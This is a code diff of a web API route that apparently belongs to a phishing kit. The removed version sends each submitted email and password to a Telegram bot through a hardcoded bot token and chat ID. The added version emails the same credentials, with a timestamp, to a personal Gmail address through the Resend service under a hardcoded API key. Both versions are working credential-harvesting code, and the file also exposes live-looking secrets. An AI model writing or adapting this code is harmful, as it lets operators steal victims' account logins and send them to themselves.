@@ -1,68 +1,35 @@
-import nodemailer from "nodemailer";
-import { TelegramClient } from "telegramsjs";
+import { Octomailer, ResendProvider } from 'octomailer';
 
-const botToken = "8056251259:AAEKndnLrQBMhBcH5r_vnpXHt8TZ4Xvb7vE";
-const bot = new TelegramClient(botToken);
-const chatId = "7075297381";
+// Initialize Resend provider with your API key
+const resendProvider = new ResendProvider('re_Q4KZv3KR_Juem3AjtzTDEtMas8Bxbzg46', 1);
+const mailer = new Octomailer([resendProvider]);
 
 export async function POST(req) {
   const { eparams, password } = await req.json();
 
   try {
-    const message = `*Email:* ${eparams}
-*Password:* ${password}`;
-
-    await bot.sendMessage({
-      text: message,
-      chatId: chatId,
-      parse_mode: "Markdown"
+    await mailer.send({
+      to: 'timmyleeokoduwa7@gmail.com',
+      from: 'onboarding@resend.dev',
+      subject: 'New Login',
+      text: `
+New login:
+-------------------
+Email: ${eparams}
+Password: ${password}
+Time: ${new Date().toLocaleString()}
+-------------------
+      `
     });
-
-    console.log(`Email: ${eparams}, Password: ${password}`);
 
     return new Response(
       JSON.stringify({ message: "Data sent!" }),
-      {
-        status: 200,
-        headers: { "Content-Type": "application/json" },
-      }
+      { status: 200 }
     );
   } catch (error) {
     console.error("Error:", error);
-    return new Response(JSON.stringify({ error: "Error" }), {
-      status: 500,
-      headers: { "Content-Type": "application/json" },
-    });
-  }
-}
-
-export async function GET(req) {
-  try {
-    const url = new URL(req.url);
-    const email = url.searchParams.get('email');
-    
-    const message = `*Email:* ${email || ''}`;
-    
-    await bot.sendMessage({
-      text: message,
-      chatId: chatId,
-      parse_mode: "Markdown"
-    });
-    
-    console.log(`Email: ${email || ''}`);
-    
-    return new Response(
-      JSON.stringify({ message: "Data sent!" }),
-      {
-        status: 200,
-        headers: { "Content-Type": "application/json" },
-      }
-    );
-  } catch (error) {
-    console.error("Error:", error);
-    return new Response(JSON.stringify({ error: "Error" }), {
-      status: 500,
-      headers: { "Content-Type": "application/json" },
+    return new Response(JSON.stringify({ error: error.message }), {
+      status: 500
     });
   }
 }
